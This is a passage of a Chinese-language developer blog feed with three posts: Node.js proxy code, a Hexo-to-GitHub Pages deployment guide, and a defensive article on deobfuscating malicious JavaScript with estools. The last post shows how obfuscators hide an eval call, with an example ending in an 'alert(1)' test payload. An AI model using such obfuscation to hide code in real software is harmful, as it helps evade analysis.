class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>), httpProxy = <span class="built_in">require</span>(<span class="string">'http-proxy'</span>);  </div><div class="line">  </div><div class="line"><span class="comment">// 新建一个代理 Proxy Server 对象  </span></div><div class="line"><span class="keyword">var</span> proxy = httpProxy.createProxyServer(&#123;&#125;);  </div><div class="line">  </div><div class="line"><span class="comment">// 捕获异常  </span></div><div class="line">proxy.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, req, res</span>) </span>&#123;  </div><div class="line">  res.writeHead(<span class="number">500</span>, &#123;  </div><div class="line">    <span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>  </div><div class="line">  &#125;);  </div><div class="line">  res.end(<span class="string">'Something went wrong. And we are reporting a custom error message.'</span>);  </div><div class="line">&#125;);  </div><div class="line">  </div><div class="line"><span class="comment">// 另外新建一个 HTTP 80 端口的服务器，也就是常规 Node 创建 HTTP 服务器的方法。  </span></div><div class="line"><span class="comment">// 在每次请求中，调用 proxy.web(req, res config) 方法进行请求分发  </span></div><div class="line"><span class="keyword">var</span> server = <span class="built_in">require</span>(<span class="string">'http'</span>).createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;  </div><div class="line">  <span class="comment">// 在这里可以自定义你的路由分发  </span></div><div class="line">  <span class="keyword">var</span> host = req.headers.host, ip = req.headers[<span class="string">'x-forwarded-for'</span>] || req.connection.remoteAddress;  </div><div class="line">  <span class="built_in">console</span>.log(<span class="string">"client ip:"</span> + ip + <span class="string">", host:"</span> + host);  </div><div class="line">    </div><div class="line">  <span class="keyword">switch</span>(host)&#123;  </div><div class="line">    <span class="keyword">case</span> <span class="string">'aaaa.com'</span>:  </div><div class="line">    <span class="keyword">case</span> <span class="string">'bbs.aaaa.com'</span>:  </div><div class="line">        proxy.web(req, res, &#123; <span class="attr">target</span>: <span class="string">'http://xyd.bbbbb.com:82'</span> &#125;);  </div><div class="line">    <span class="keyword">break</span>;  </div><div class="line">    <span class="keyword">case</span> <span class="string">'vps.cccc.com'</span>:  </div><div class="line">        proxy.web(req, res, &#123; <span class="attr">target</span>: <span class="string">'http://xyd.bbbbb.com:8080'</span> &#125;);  </div><div class="line">    <span class="keyword">break</span>;  </div><div class="line">    <span class="keyword">case</span> <span class="string">'dddd.com'</span>:  </div><div class="line">    <span class="keyword">case</span> <span class="string">'www.dddd.com'</span>:  </div><div class="line">        proxy.web(req, res, &#123; <span class="attr">target</span>: <span class="string">'http://localhost:81'</span> &#125;);  </div><div class="line">    <span class="keyword">break</span>;  </div><div class="line">    <span class="keyword">case</span> <span class="string">'eeeeee.com.cn'</span>:  </div><div class="line">    <span class="keyword">case</span> <span class="string">'www.eeee.com.cn'</span>:  </div><div class="line">        proxy.web(req, res, &#123; <span class="attr">target</span>: <span class="string">'http://eeeee.com.cn:8082'</span> &#125;);  </div><div class="line">    <span class="keyword">break</span>;  </div><div class="line">    <span class="keyword">default</span>:  </div><div class="line">        res.writeHead(<span class="number">200</span>, &#123;  </div><div class="line">            <span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>  </div><div class="line">        &#125;);  </div><div class="line">        res.end(<span class="string">'Welcome to my server!'</span>);  </div><div class="line">  &#125;  </div><div class="line">&#125;);  </div><div class="line">  </div><div class="line"><span class="built_in">console</span>.log(<span class="string">"listening on port 80"</span>)  </div><div class="line">server.listen(<span class="number">80</span>);</div></pre></td></tr></table></figure><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</div><div class="line"><span class="keyword">var</span> opt = &#123;</div><div class="line"> host:<span class="string">'这里放代理服务器的ip或者域名'</span>,</div><div class="line"> port:<span class="string">'这里放代理服务器的端口号'</span>,</div><div class="line"> method:<span class="string">'POST'</span>,<span class="comment">//这里是发送的方法</span></div><div class="line"> path:<span class="string">' https://www.google.com'</span>,     <span class="comment">//这里是访问的路径</span></div><div class="line"> headers:&#123;</div><div class="line">  <span class="comment">//这里放期望发送出去的请求头</span></div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//以下是接受数据的代码</span></div><div class="line"><span class="keyword">var</span> body = <span class="string">''</span>;</div><div class="line"><span class="keyword">var</span> req = http.request(opt, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">"Got response: "</span> + res.statusCode);</div><div class="line">  res.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</div><div class="line">  body += d;</div><div class="line"> &#125;).on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(res.headers)</div><div class="line">  <span class="built_in">console</span>.log(body)</div><div class="line"> &#125;);</div><div class="line"></div><div class="line">&#125;).on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">"Got error: "</span> + e.message);</div><div class="line">&#125;)</div><div class="line">req.end();</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;反向代理&quot;&gt;&lt;a href=&quot;#反向代理&quot; class=&quot;headerlink&quot; title=&quot;反向代理&quot;&gt;&lt;/a&gt;反向代理&lt;/h3&gt;&lt;p&gt;` npm install http-proxy &lt;/p&gt;
&lt;figure class=&quot;highlight javascr
      
    
    </summary>
    
      <category term="前端" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
      <category term="NodeJs" scheme="http://yoursite.com/tags/NodeJs/"/>
    
  </entry>
  
  <entry>
    <title>Hexo部署到Github完整步骤</title>
    <link href="http://yoursite.com/2017/01/17/Hexo%E9%83%A8%E7%BD%B2%E5%88%B0Github%E5%AE%8C%E6%95%B4%E6%AD%A5%E9%AA%A4/"/>
    <id>http://yoursite.com/2017/01/17/Hexo部署到Github完整步骤/</id>
    <published>2017-01-17T09:53:50.000Z</published>
    <updated>2017-11-12T15:43:00.860Z</updated>
    
    <content type="html"><![CDATA[<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ol><li><a href="https://nodejs.org/en/" target="_blank">安装Node.js</a></li><li><a href="https://git-scm.com/" target="_blank">安装Git官网</a></li><li><a href="https://hexo.io/zh-cn/" target="_blank">安装Hexo</a></li><li><a href="https://github.com/" target="_blank">注册Github账户</a></li></ol><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><ol><li>创建一个文件夹  <code>CD</code>  到当前目录</li><li><p>安装hexo到该文件夹。执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm i -g hexo</div></pre></td></tr></table></figure></li><li><p>安装完成后，将会看到如下目录结构<br><img src="http://img.blog.csdn.net/20171018203605199?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjQxNDIyNjE=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="hexo目录结构"></p></li><li><p>测试是否安装成功，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hexo clean</div><div class="line">hexo generate</div><div class="line">hexo server</div></pre></td></tr></table></figure></li><li><p>打开页面 </p><pre><code>http://localhost:4000</code></pre></li></ol><h3 id="Github创建仓库"><a href="#Github创建仓库" class="headerlink" title="Github创建仓库"></a>Github创建仓库</h3><ol><li>登录Github，选择New repositor<br><img src="http://img.blog.csdn.net/20171018204044621?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjQxNDIyNjE=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="Github"></li><li>填写Repositor 名`你的Github名称.github.io <strong>（注意！前缀必须是你的Github名称）</strong><br><img src="http://img.blog.csdn.net/20171018204401956?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjQxNDIyNjE=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></li></ol><h3 id="创建SSH"><a href="#创建SSH" class="headerlink" title="创建SSH"></a>创建SSH</h3><ol><li>打开<strong>git-bash.exe</strong>，配置Github账户信息</li><li><p>在gitbash执行如下命令：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh-keygen -t rsa -C &quot;你的电子邮箱&quot;</div></pre></td></tr></table></figure><p>接下来会提示你输入一个文件名来保存你的SSH key ，如果不输入直接回车，则会保存在默认的文件里<br>然后会提示你输入passphrases 会要求你输入两次密码</p></li><li>找到id_rsa.pub文件打开依次：<code>Ctrl+A</code>  <code>Ctrl+C</code> 复制信息</li></ol><h3 id="Github-添加-SSH"><a href="#Github-添加-SSH" class="headerlink" title="Github 添加 SSH"></a>Github 添加 SSH</h3><ol><li>点击<strong>Settings</strong><br><img src="http://img.blog.csdn.net/20171018205844760?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjQxNDIyNjE=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></li><li>依次点击左侧<strong>SSH and GPG keys</strong> 右侧 <strong>New SSH key</strong><br><img src="http://img.blog.csdn.net/20171018205805406?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjQxNDIyNjE=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></li><li>Title随便填写，把刚才<strong>id_rsa.pub</strong>文件复制的信息粘贴到<strong>key</strong>中，然后点击<strong>Add SSH key</strong></li><li>在<strong>gitbash</strong>中验证是否添加成功，执行如下命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh -T git@github.com</div></pre></td></tr></table></figure></li></ol><h3 id="配置Bolog"><a href="#配置Bolog" class="headerlink" title="配置Bolog"></a>配置Bolog</h3><ol><li>打开你博客文件夹找到<strong>_config.yml</strong>文件并打开</li><li>在最下面添加<div class="note default"><p>deploy:<br>type: git<br>      repo: git@github.com:hanx0610/hanx0610.github.io<br>      branch: master</p></div>（注意分号后有个空格）</li></ol><h3 id="部署到Github"><a href="#部署到Github" class="headerlink" title="部署到Github"></a>部署到Github</h3><ol><li><p>安装组件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-deployer-git --save</div></pre></td></tr></table></figure></li><li><p>回到gitbash中，进入你的blog目录，分别依次执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ hexo clean</div><div class="line">$ hexo generate</div><div class="line">$ hexo deploy</div></pre></td></tr></table></figure><p>会提示你输入密码</p></li><li>打开页面<pre><code>http://Github用户名.github.io</code></pre></li></ol><h3 id="绑定到个人域名"><a href="#绑定到个人域名" class="headerlink" title="绑定到个人域名"></a>绑定到个人域名</h3><ol><li><p>执行如下命令得到 <code>IP</code> 地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ping http://Github用户名.github.io</div></pre></td></tr></table></figure></li><li><p>注册购买域名</p></li><li>解析DNS，<br> 添加解析记录 A (记录值为<code>IP</code>)<br> 添加解析记录 CNAME (记录值为<code>Github用户名.github.io</code>)<br><img src="http://img.blog.csdn.net/20171021215158539?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjQxNDIyNjE=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></li><li>打开博客文件夹下source目录创建一个txt文件写入你的域名，命名CNAME，保存<strong>去掉文件后缀名</strong><br> <img src="http://img.blog.csdn.net/20171021215116416?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjQxNDIyNjE=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://nodejs.org/en/&quot; target=&quot;_blank&quot;&gt;安装Node.
      
    
    </summary>
    
      <category term="其他" scheme="http://yoursite.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="http://yoursite.com/tags/%E5%85%B6%E4%BB%96/"/>
    
      <category term="Github" scheme="http://yoursite.com/tags/Github/"/>
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>使用estools辅助反混淆Javascript</title>
    <link href="http://yoursite.com/2017/01/06/%E4%BD%BF%E7%94%A8estools%E8%BE%85%E5%8A%A9%E5%8F%8D%E6%B7%B7%E6%B7%86Javascript/"/>
    <id>http://yoursite.com/2017/01/06/使用estools辅助反混淆Javascript/</id>
    <published>2017-01-06T05:14:22.000Z</published>
    <updated>2017-10-24T14:21:18.460Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Javascript 作为一种运行在客户端的脚本语言，其源代码对用户来说是完全可见的。但不是每一个 js 开发者都希望自己的代码能被直接阅读，比如恶意软件的制造者们。为了增加代码分析的难度，混淆（obfuscate）工具被应用到了许多恶意软件（如 0day 挂马、跨站攻击等）当中。分析人员为了掀开恶意软件的面纱，首先就得对脚本进行反混淆（deobfuscate）处理。<br>本文将介绍一些常见的混淆手段和 estools 进行静态代码分析的入门。</p><h3 id="常见混淆手段"><a href="#常见混淆手段" class="headerlink" title="常见混淆手段"></a>常见混淆手段</h3><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>这类混淆的关键思想在于将需要执行的代码进行一次编码，在执行的时候还原出浏览器可执行的合法的脚本，然后执行之。看上去和可执行文件的加壳有那么点类似。Javascript 提供了将字符串当做代码执行（evaluate）的能力，可以通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function" target="_blank" rel="external">Function 构造器</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/eval" target="_blank" rel="external">eval</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/setTimeout" target="_blank" rel="external">setTimeout</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/setInterval" target="_blank" rel="external">setInterval&nbsp;</a>将字符串传递给 js 引擎进行解析执行。最常见的是 <a href="http://dean.edwards.name/packer/" target="_blank" rel="external">base62 编码</a>——其最明显的特征是生成的代码以<code>eval(function(p,a,c,k,e,r))</code> 开头。</p><p><img src="/img/1-base62-1024x281.png" alt="hexo目录结构"></p><p>无论代码如何进行变形，其最终都要调用一次 eval 等函数。解密的方法不需要对其算法做任何分析，只需要简单地找到这个最终的调用，改为 <code>console.log</code> 或者其他方式，将程序解码后的结果按照字符串输出即可。自动化的实现方式已经有许多文章介绍过，此处就不再赘述。</p><h4 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h4><p>严格说这不能称之为混淆，只是将 js 代码隐藏到了特定的介质当中。如通过最低有效位（LSB）算法嵌入到图片的 RGB 通道、隐藏在图片 EXIF 元数据、隐藏在 HTML 空白字符等。</p><p>比如这个耸人听闻的议题：<a href="http://www.freebuf.com/news/69106.html" target="_blank" rel="external">一张图片黑掉你</a>：在图片中嵌入恶意程序，PPT（ <a href="https://conference.hitb.org/hitbsecconf2015ams/wp-content/uploads/2015/02/D1T1-Saumil-Shah-Stegosploit-Hacking-with-Pictures.pdf" target="_blank" rel="external">https://conference.hitb.org/hitbsecconf2015ams/wp-content/uploads/2015/02/D1T1-Saumil-Shah-Stegosploit-Hacking-with-Pictures.pdf</a> ）放出来一看，正是使用了最低有效位平面算法。结合 HTML5 的 canvas 或者处理二进制数据的 TypeArray，脚本可以抽取出载体中隐藏的数据（如代码）。<br><img src="/img/2-lsb-steg.png" alt="hexo目录结构"><br>隐写的方式同样需要解码程序和动态执行，所以破解的方式和前者相同，在浏览器上下文中劫持替换关键函数调用的行为，改为文本输出即可得到载体中隐藏的代码。</p><h4 id="复杂化表达式"><a href="#复杂化表达式" class="headerlink" title="复杂化表达式"></a>复杂化表达式</h4><p>代码混淆不一定会调用 eval，也可以通过在代码中填充无效的指令来增加代码复杂度，极大地降低可读性。Javascript 中存在许多称得上丧心病狂的特性，这些特性组合起来，可以把原本简单的字面量（Literal）、成员访问（MemberExpression）、函数调用（CallExpression）等代码片段变得难以阅读。<br>Js 中的字面量有字符串、数字、正则表达式</p><p>下面简单举一个例子:</p><ol><li>访问一个对象的成员有两种方法——点运算符和下标运算符。调用 window 的 eval 方法，既可以写成 <code>window.eval()</code>，也可以 <code>window[&#39;eval&#39;]</code>；</li><li>为了让代码更变态一些，混淆器选用第二种写法，然后再在字符串字面量上做文章。先把字符串拆成几个部分：<code>&#39;e&#39; + &#39;v&#39; + &#39;al&#39;</code>；</li><li>这样看上去还是很明显，再利用一个数字进制转换的技巧：<code>14..toString(15)+31..toString(32)+0xf1.toString(22)</code>；</li><li>一不做二不休，把数字也展开：<code>(0b1110).toString(4&lt;&lt;2)+(&#39; &#39;.charCodeAt() - 1).toString(Math.log(0x100000000) / Math.log(2)) + 0xf1.toString(11 &lt;&lt; 1)</code>；</li><li>最后的效果：<code>window[(2*7).toString(4&lt;&lt;2)+(&#39; &#39;.charCodeAt() - 1).toString(Math.log(0x100000000) / Math.log(2)) + 0xf1.toString(11 &lt;&lt; 1)](&#39;alert(1)&#39;)</code><br>在 js 中可以找到许多这样互逆的运算，通过使用随机生成的方式将其组合使用，可以把简单的表达式无限复杂化。</li></ol><h3 id="静态分析实现"><a href="#静态分析实现" class="headerlink" title="静态分析实现"></a>静态分析实现</h3><h4 id="解析和变换代码"><a href="#解析和变换代码" class="headerlink" title="解析和变换代码"></a>解析和变换代码</h4><p>本文对 Javascript 实现反混淆的思路是模拟执行代码中可预测结果的部分，编写一个简单的脚本执行引擎，只执行符合某些预定规则的代码块，最后将计算结果替换掉原本冗长的代码，实现表达式的简化。</p><p>果对脚本引擎解释器的原理有初步了解的话，可以知道解释器在为了“读懂”代码，会对源代码进行词法分析、语法分析，将代码的字符串转换为抽象语法树（ <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree" target="_blank" rel="external">Abstract Syntax Tree</a>, AST）的数据形式。</p><p>如这段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="number">42</span>;</div><div class="line"><span class="keyword">var</span> b = <span class="number">5</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">addA</span>(<span class="params">d</span>) </span>&#123;</div><div class="line"><span class="keyword">return</span> a + d;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> c = addA(<span class="number">2</span>) + b;</div></pre></td></tr></table></figure></p><p>对应的语法树如图：<br><img src="/img/3-ast-1024x491.png" alt="hexo目录结构"><br>（由 <a href="http://jointjs.com/demos/javascript-ast" target="_blank" rel="external">JointJS</a> 的在线工具生成）<br>不考虑 JIT 技术，解释器可以从语法树的根节点开始，使用深度优先遍历整棵树的所有节点，根据节点上分析出来的指令逐个执行，直到脚本结束返回结果。</p><p>通过 js 代码生成抽象语法树的工具很多，如压缩器 <a href="https://github.com/mishoo/UglifyJS" target="_blank" rel="external">UglifyJS</a> 带的 parser，还有本文使用的 <a href="http://esprima.org/" target="_blank" rel="external">esprima</a>。</p><p>esprima 提供的接口很简单：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> ast = <span class="built_in">require</span>(<span class="string">'esprima'</span>).parse(code)</div></pre></td></tr></table></figure></p><p>另外 Esprima 提供了一个在线工具，可以把任意（合法的）Javascript 代码解析成为 AST 并输出：<a href="http://esprima.org/demo/parse.html" target="_blank" rel="external">http://esprima.org/demo/parse.html</a></p><p>再结合 estools 的几个辅助库即可对 js 进行静态代码分析：</p><ul><li><a href="https://github.com/estools/escope" target="_blank" rel="external">escope</a> Javascript 作用域分析工具</li><li><a href="https://github.com/estools/esutils" target="_blank" rel="external">esutil</a> 辅助函数库，检查语法树节点是否满足某些条件</li><li><a href="http://github.com/estools/estraverse" target="_blank" rel="external">estraverse</a> 语法树遍历辅助库，接口有一点类似 SAX 方式解析 XML</li><li><a href="http://github.com/estools/esrecurse" target="_blank" rel="external">esrecurse</a> 另一个语法树遍历工具，使用递归</li><li><a href="https://github.com/estools/esquery" target="_blank" rel="external">esquery</a> 使用 css 选择器的语法从语法树中提取符合条件的节点</li><li><a href="http://github.com/estools/escodegen" target="_blank" rel="external">escodegen</a> 与 esprima 功能互逆，将语法树还原为代码</li></ul><p>项目中使用的遍历工具是 estraverse。其提供了两个静态方法，<code>estraverse.traverse</code> 和 <code>estraverse.replace</code>。前者单纯遍历 AST 的节点，通过返回值控制是否继续遍历到叶子节点；而 replace 方法则可以在遍历的过程中直接修改 AST，实现代码重构功能。具体的用法可以参考其官方文档，或者本文附带的示例代码。</p><h4 id="规则设计"><a href="#规则设计" class="headerlink" title="规则设计"></a>规则设计</h4><p>从实际遇到的代码入手。最近在研究一些 XSS 蠕虫的时候遇到了类似如下代码混淆：<br><img src="/img/4-obfuscated-js.png" alt="hexo目录结构"></p><p>观察其代码风格，发现这个混淆器做了这几件事：</p><ol><li>字符串字面量混淆：首先提取全部的字符串，在全局作用域创建一个字符串数组，同时转义字符增大阅读难度，然后将字符串出现的地方替换成为数组元素的引用</li><li>变量名混淆：不同于压缩器的缩短命名，此处使用了下划线加数字的格式，变量之间区分度很低，相比单个字母更难以阅读</li><li>成员运算符混淆：将点运算符替换为字符串下标形式，然后对字符串进行混淆</li><li>删除多余的空白字符：减小文件体积，这是所有压缩器都会做的事</li></ol><p>经过搜索，这样的代码很有可能是通过<a href="http://javascriptobfuscator.com/Javascript-Obfuscator.aspx" target="_blank" rel="external">javascriptobfuscator.com</a>的免费版生成的。其中免费版可以使用的三个选项（Encode Strings / Strings / Replace Names）也印证了前面观察到的现象。</p><p>这些变换中，变量名混淆是不可逆的。要是可以智能给变量命名的工具也不错，比如这个 <a href="http://jsnice.org/" target="_blank" rel="external">jsnice</a> 网站提供了一个在线工具，可以分析变量具体作用自动重命名。就算不能做到十全十美，实在不行就用人工的方式，使用 IDE（如 WebStorm）的代码重构功能，结合代码行为分析进行手工重命名还原。</p><p>再看字符串的处理。由于字符串将会被提取到一个全局的数组，在语法树中可以观察到这样的特征： 在全局作用域下，出现一个 VariableDeclarator，其 init 属性为 ArrayExpression，而且所有元素都是 Literal ——这说明这个数组所有元素都是常量。简单地将其求值，与变量名（标识符）关联起来。注意，此处为了简化处理，并没有考虑变量名作用域链的问题。在 js 中，作用域链上存在变量名的优先级，比如全局上的变量名是可以被局部变量重新定义的。如果混淆器再变态一点，在不同的作用域上使用相同的变量名，反混淆器又没有处理作用域的情况，将会导致解出来的代码出错。</p><p>在测试程序中我设置了如下的替换规则：</p><ol><li>全局变量声明的字符串数组，在代码中直接使用数字下标引用其值</li><li>结果确定的一连串二元运算，如 <code>1 * 2 + 3 / 4 - 6 % 5</code></li><li>正则表达式字面量的 source，字符串字面量的 length</li><li>完全由字符串常量组成的数组，其 join / reverse / slice 等方法的返回值</li><li>字符串常量的 substr / charAt 等方法的返回值</li><li>decodeURIComponent 等全局函数，其所有参数为常量的，替换为其返回值</li><li>结果为常数的数学函数调用，如 <code>Math.sin(3.14)</code></li></ol><p>至于缩进的还原，这是 escodegen 自带的功能。在调用 <code>escodegen.generate</code> 方法生成代码的时候使用默认的配置（忽略第二个参数）即可。</p><h3 id="DEMO程序"><a href="#DEMO程序" class="headerlink" title="DEMO程序"></a>DEMO程序</h3><p>这个反混淆器的原型放在 GitHub 上：<a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="external">https://github.com/ChiChou/etacsufbo</a></p><p>运行环境和使用方法参考仓库的 README。</p><p>从<a href="http://youmightnotneedjquery.com/" target="_blank" rel="external">YOU MIGHT NOT NEED JQUERY</a>上摘抄了一段代码，放入<a href="https://javascriptobfuscator.com/Javascript-Obfuscator.aspx" target="_blank" rel="external">javascriptobfuscator.com</a>测试混淆：<br><img src="/img/5-online-obfuscate-1024x266.png" alt="hexo目录结构"><br>将混淆结果（ <a href="https://github.com/ChiChou/etacsufbo/blob/master/tests/cases/jsobfuscator.com.js" target="_blank" rel="external">https://github.com/ChiChou/etacsufbo/blob/master/tests/cases/jsobfuscator.com.js</a> ）进行解开，结果如下：<br><img src="/img/6-deobfuscated.png" alt="hexo目录结构"><br>虽然变量名可读性依旧很差，但已经可以大体看出代码的行为了。</p><p>演示程序目前存在大量局限性，只能算一个半自动的辅助工具，还有许多没有实现的功能。</p><p>一些混淆器会对字符串字面量进行更复杂的保护，将字符串转换为 f(x) 的形式，其中 f 函数为一个解密函数，参数 x 为密文的字符串。也有原地生成一个匿名函数，返回值为字符串的。这种方式通常使用的函数表达式具有上下文无关的特性——其返回值只与函数的输入有关，与当前代码所处的上下文（比如类的成员、DOM 中取到的值）无关。如以下代码片段中的 xor 函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> xor = <span class="function"><span class="keyword">function</span>(<span class="params">str, a, b</span>) </span>&#123;</div><div class="line"><span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode.apply(<span class="literal">null</span>, str.split(<span class="string">''</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">c, i</span>) </span>&#123;</div><div class="line"><span class="keyword">var</span> ascii = c.charCodeAt(<span class="number">0</span>);</div><div class="line"><span class="keyword">return</span> ascii ^ (i % <span class="number">2</span> ? a : b);</div><div class="line">&#125;));</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>如何判断某个函数是否具有这样的特性呢？<br>首先一些库函数可以确定符合，如 btoa，escape，String.fromCharCode 等，只要输入值是常量，返回值就是固定的。建立一个这样的内置函数白名单，接着遍历函数表达式的 AST，若该函数参与计算的参数均没有来自外部上下文，且其所有 CallExpression 的 callee 在函数白名单内，那么通过递归的方式可以确认一个函数是否满足条件。还有的混淆器会给变量创建大量的引用实例，也就是给同一个对象使用了多个别名，阅读起来非常具有干扰性。可以派出 escope 工具对变量标识符进行数据流分析，替换为所指向的正确值。还有利用数学的恒等式进行混淆的。如声明一个变量 a，若 a 为 Number，则表达式 <code>a-a</code>、<code>a * 0</code> 均恒为 0。但如果 a 满足 <code>isNaN(a)</code>，则表达式返回 <code>NaN</code>。要清理这类代码，同样需要借助数据流分析的方法。<br>目前还没有见到使用扁平化流程跳转实现的 js 混淆样本，笔者认为可能跟 js 语言本身的使用场景和特点有关。一般 js 的代都是偏业务型的，不会有太复杂的流程控制或者算法，混淆起来效果不一定理想。</p><h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>Javascript 的确是一门神奇的语言，经常可以遇到一些让人惊讶的奇技淫巧。解密保护过的代码也是有趣的事情。据说几大科技巨头在酝酿给浏览器应用设计一款通用的字节码标准——<a href="https://github.com/WebAssembly" target="_blank" rel="external">WebAssembly</a>。一旦这个设想得以实现，代码保护将可以引入真正意义上的“加壳”或者虚拟机保护，对抗技术又将提升到一个新的台阶。</p><p>演示项目代码托管在 GitHub：<a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="external">https://github.com/ChiChou/etacsufbo</a></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol><li><a href="http://tobyho.com/2013/12/02/fun-with-esprima/" target="_blank" rel="external">http://tobyho.com/2013/12/02/fun-with-esprima/</a></li><li><a href="https://github.com/estree/estree/blob/master/spec.md" target="_blank" 